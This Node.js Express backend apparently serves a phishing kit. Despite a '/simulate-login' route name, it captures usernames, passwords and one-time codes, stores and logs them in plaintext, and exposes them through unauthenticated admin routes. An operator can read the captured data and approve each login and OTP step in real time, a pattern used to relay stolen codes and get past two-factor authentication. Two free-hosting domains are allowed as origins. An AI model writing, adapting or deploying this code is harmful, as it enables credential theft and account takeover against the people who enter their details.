const express = require('express');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();

const allowedOrigins = [
  'https://ppan002.gt.tc',
  'https://wf1055.rf.gd',
  'http://localhost:3000',
];

app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    } else {
      return callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
}));

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// State variables
let loginData = null;
let approved = false;
let otpApproved = false;

/* ==============================
   USER ROUTES
============================== */
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.post('/simulate-login', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ message: 'Username and password are required' });
  }
  loginData = { username, password, otp: null };
  approved = false;
  otpApproved = false;
  console.log(`📥 Login submitted: ${JSON.stringify(loginData)}`);
  res.json({ message: 'Login data submitted' });
});

// Public check for frontend
app.get('/check-approval', (req, res) => {
  res.json({ approved });
});

app.post('/submit-otp', (req, res) => {
  const { otp } = req.body;
  if (!loginData) {
    return res.status(400).json({ message: 'No login session found' });
  }
  if (!otp) {
    return res.status(400).json({ message: 'OTP is required' });
  }
  loginData.otp = otp;
  otpApproved = false;
  console.log(`📥 OTP submitted: ${otp}`);
  res.json({ message: 'OTP submitted successfully' });
});

app.post('/verify-otp', (req, res) => {
  if (!loginData) {
    return res.status(400).json({ success: false, message: 'No login data submitted' });
  }
  if (!approved) {
    return res.status(403).json({ success: false, message: 'Login not approved yet' });
  }
  if (!otpApproved) {
    return res.status(403).json({ success: false, message: 'OTP not approved yet' });
  }
  return res.json({ success: true, message: 'OTP approved, access granted' });
});

/* ==============================
   ADMIN ROUTES (no Basic Auth)
============================== */
app.post('/approve-login', (req, res) => {
  if (!loginData) {
    return res.status(400).json({ message: 'No login data to approve' });
  }
  approved = true;
  console.log('✅ Login approved by admin.');
  res.json({ message: 'Login approved' });
});

app.post('/approve-otp', (req, res) => {
  if (!loginData || !loginData.otp) {
    return res.status(400).json({ message: 'No OTP data to approve' });
  }
  otpApproved = true;
  console.log('✅ OTP approved by admin.');
  res.json({ message: 'OTP approved' });
});

app.post('/reset-login', (req, res) => {
  console.log('🔁 Login session reset by admin.');
  loginData = null;
  approved = false;
  otpApproved = false;
  res.json({ message: 'Login reset successfully' });
});

app.get('/get-login-data', (req, res) => {
  res.json({ loginData, approved, otpApproved });
});

/* ==============================
   START SERVER
============================== */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running at https://my-node-backend-4nfy.onrender.com`);
});
